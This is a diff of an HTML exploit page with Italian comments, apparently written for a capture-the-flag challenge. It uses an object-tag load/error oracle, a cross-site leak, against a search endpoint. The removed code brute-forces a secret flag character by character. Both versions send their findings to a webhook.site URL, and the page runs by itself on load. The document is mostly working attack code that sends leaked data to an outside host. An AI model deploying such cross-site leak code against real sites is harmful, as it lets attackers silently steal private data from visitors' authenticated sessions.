@@ -20,30 +20,51 @@
     <div id="result">In attesa di risultati...</div>
 
     <script>
-        const validChars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+[]{}|;:,.<>?'; // Caratteri validi
-        let currentFlag = ''; // Flag trovata
-
         const leak = async (url) => {
             return new Promise((resolve) => {
                 let s = document.createElement('object');
                 s.data = url;
                 s.onload = (e) => {
                     e.target.remove();
-                    return resolve(0); // Risorsa accessibile (status 200)
+                    return resolve(0); // Risorsa accessibile
                 };
                 s.onerror = (e) => {
                     e.target.remove();
-                    return resolve(1); // Risorsa non accessibile (status 404)
+                    return resolve(1); // Risorsa non accessibile
                 };
                 document.body.appendChild(s);
             });
         };
 
+        // Funzione da chiamare al caricamento della pagina
+        const testResourceLeak = async () => {
+            const url = 'https://matrix.capturetheflags.site/search?s=ajsajnONSNDsadOSNonsA'; // Sostituisci con l'URL da testare
+            const result = await leak(url);
+            const resultDiv = document.getElementById('result');
+
+            let message;
+            if (result === 0) {
+                resultDiv.textContent = 'Risorsa accessibile (status 200)';
+                message = 'Risorsa accessibile';
+            } else {
+                resultDiv.textContent = 'Risorsa non accessibile (status 404 o errore)';
+                message = 'Risorsa non accessibile';
+            }
+
+            // Invia il log al server Webhook utilizzando GET
+            await logResult(message);
+        };
+
+        // Funzione per inviare i log al Webhook
         const logResult = async (message) => {
-            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // URL del Webhook
+            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // Sostituisci con il tuo URL di Webhook.site
             try {
+                // Costruisci l'URL con il messaggio come parametro
                 const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
-                const response = await fetch(urlWithParams, { method: 'GET' });
+                const response = await fetch(urlWithParams, {
+                    method: 'GET', // Cambiato a GET
+                });
+
                 if (!response.ok) {
                     console.error('Errore durante l\'invio del log:', response.statusText);
                 } else {
@@ -54,35 +75,8 @@
             }
         };
 
-        const guessFlag = async () => {
-            for (let i = 0; i < 30; i++) { // Limite massimo di lunghezza per evitare loop infiniti
-                let foundChar = false;
-
-                for (let char of validChars) {
-                    const url = `https://matrix.capturetheflags.site/search?s=${currentFlag}${char}`;
-                    const result = await leak(url);
-
-                    if (result === 0) { // Carattere trovato
-                        currentFlag += char;
-                        document.getElementById('result').textContent = `Flag parziale trovata: ${currentFlag}`;
-                        console.log(`Flag parziale trovata: ${currentFlag}`);
-                        await logResult(`Flag parziale trovata: ${currentFlag}`);
-                        foundChar = true;
-                        break; // Passa al carattere successivo
-                    }
-                }
-
-                if (!foundChar) { // Se nessun carattere è stato trovato, termina la ricerca
-                    console.log('Flag completa trovata:', currentFlag);
-                    await logResult(`Flag completa trovata: ${currentFlag}`);
-                    break;
-                }
-            }
-        };
-
-        document.addEventListener('DOMContentLoaded', () => {
-            guessFlag();
-        });
+        // Esegui il test al caricamento del DOM
+        document.addEventListener('DOMContentLoaded', testResourceLeak);
     </script>
 </body>
 </html>
